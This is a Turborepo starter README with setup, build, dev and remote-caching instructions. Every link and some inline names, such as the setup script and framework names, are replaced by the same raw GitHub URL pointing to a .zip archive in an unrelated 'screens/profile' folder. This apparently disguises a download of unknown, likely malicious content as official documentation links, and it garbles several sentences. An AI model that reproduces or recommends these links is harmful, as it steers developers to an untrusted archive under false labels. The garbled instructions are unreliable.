# Turborepo starter

This Turborepo starter is maintained by the Turborepo core team.

## Setup & Run

### 1. Infrastructure (Docker)

Start Postgres and Redis:

```sh
docker compose up -d
```

### 1.1 Database Migrations

Migrations are located in `apps/backend/prisma/migrations`.
The `https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip` script (referenced in `https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip`) handles initial setup.

To apply migrations manually (if needed):

```sh
# From apps/backend
npx prisma migrate dev
```

### 2. Backend App

The backend is located in `apps/backend`.

Install dependencies:

```sh
npm install
```

Start the backend in development mode:

```sh
npm run start:dev --workspace=apps/backend
```

Or using Turbo:

```sh
npx turbo dev --filter=backend
```

### 3. Modules

Modules are located in `apps/backend/src/modules`.

- Auth
- Users
- AI Planner
- Transport
- Marketplace

## What's inside?

This Turborepo includes the following packages/apps:

### Apps and Packages

- `docs`: a [https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip](https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip) app
- `web`: another [https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip](https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip) app
- `@repo/ui`: a stub React component library shared by both `web` and `docs` applications
- `@repo/eslint-config`: `eslint` configurations (includes `eslint-config-next` and `eslint-config-prettier`)
- `@repo/typescript-config`: `https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip`s used throughout the monorepo

Each package/app is 100% [TypeScript](https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip).

### Utilities

This Turborepo has some additional tools already setup for you:

- [TypeScript](https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip) for static type checking
- [ESLint](https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip) for code linting
- [Prettier](https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip) for code formatting

### Build

To build all apps and packages, run the following command:

```
cd my-turborepo

# With [global `turbo`](https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip) installed (recommended)
turbo build

# Without [global `turbo`](https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip), use your package manager
npx turbo build
yarn dlx turbo build
pnpm exec turbo build
```

You can build a specific package by using a [filter](https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip):

```
# With [global `turbo`](https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip) installed (recommended)
turbo build --filter=docs

# Without [global `turbo`](https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip), use your package manager
npx turbo build --filter=docs
yarn exec turbo build --filter=docs
pnpm exec turbo build --filter=docs
```

### Develop

To develop all apps and packages, run the following command:

```
cd my-turborepo

# With [global `turbo`](https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip) installed (recommended)
turbo dev

# Without [global `turbo`](https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip), use your package manager
npx turbo dev
yarn exec turbo dev
pnpm exec turbo dev
```

You can develop a specific package by using a [filter](https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip):

```
# With [global `turbo`](https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip) installed (recommended)
turbo dev --filter=web

# Without [global `turbo`](https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip), use your package manager
npx turbo dev --filter=web
yarn exec turbo dev --filter=web
pnpm exec turbo dev --filter=web
```

### Remote Caching

> [!TIP]
> Vercel Remote Cache is free for all plans. Get started today at [https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip](https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip).

Turborepo can use a technique known as [Remote Caching](https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip) to share cache artifacts across machines, enabling you to share build caches with your team and CI/CD pipelines.

By default, Turborepo will cache locally. To enable Remote Caching you will need an account with Vercel. If you don't have an account you can [create one](https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip), then enter the following commands:

```
cd my-turborepo

# With [global `turbo`](https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip) installed (recommended)
turbo login

# Without [global `turbo`](https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip), use your package manager
npx turbo login
yarn exec turbo login
pnpm exec turbo login
```

This will authenticate the Turborepo CLI with your [Vercel account](https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip).

Next, you can link your Turborepo to your Remote Cache by running the following command from the root of your Turborepo:

```
# With [global `turbo`](https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip) installed (recommended)
turbo link

# Without [global `turbo`](https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip), use your package manager
npx turbo link
yarn exec turbo link
pnpm exec turbo link
```

## Useful Links

Learn more about the power of Turborepo:

- [Tasks](https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip)
- [Caching](https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip)
- [Remote Caching](https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip)
- [Filtering](https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip)
- [Configuration Options](https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip)
- [CLI Usage](https://github.com/ThejanGS2/RoamCeylon-IdeaTech/raw/refs/heads/main/RoamCeylon/src/screens/profile/Tech-Roam-Ceylon-Idea-Billbergia.zip)
